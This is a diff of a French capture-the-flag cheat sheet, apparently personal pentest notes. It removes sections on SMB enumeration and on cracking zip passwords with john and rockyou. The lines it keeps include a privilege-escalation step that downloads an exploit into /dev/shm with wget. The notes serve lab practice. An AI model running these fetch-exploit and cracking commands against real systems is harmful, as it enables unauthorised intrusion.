@@ -1,11 +1,11 @@
 # Capture The Flag
 
+> Migration vers `pentest.md` en cours
+
 - [Reconnaissance](#reconnaissance)
-  - [TODO Enumération SMB](#todo-enumération-smb)
 - [DNS](#dns)
 - [Vulnérabilités](#vulnérabilités)
 - [Local Privilege Escalation](#local-privilege-escalation)
-- [Cassage de mot de passe](#cassage-de-mot-de-passe)
 - [SQLite](#sqlite)
 
 ---
@@ -46,14 +46,6 @@ Sur Windows :
 ipconfig -all
 arp -a
 route
-```
-
-### TODO Enumération SMB
-
-Si les ports `139` et `445` sont ouverts, il y a des chances que SMB tourne sur la machine.
-
-```bash
-enum4linux -U <ip>
 ```
 
 ## DNS
@@ -100,24 +92,6 @@ uname -a
 
 # télécharger l'exploit (et le stocker en RAM)
 wget URL > /dev/shm/lpe
-```
-
-Sur ta machine :
-```bash
-# regarder s'il existe des exploit
-searchsploit 4.15
-# le télécharger
-searchsploit -m <filename>
-# l'héberger
-python -m SimpleHTTPServer
-```
-
-## Cassage de mot de passe
-
-Pour extraire le hash du mot de passe d'un zip : `zip2john file.zip > hash.txt`
-
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
 ## SQLite
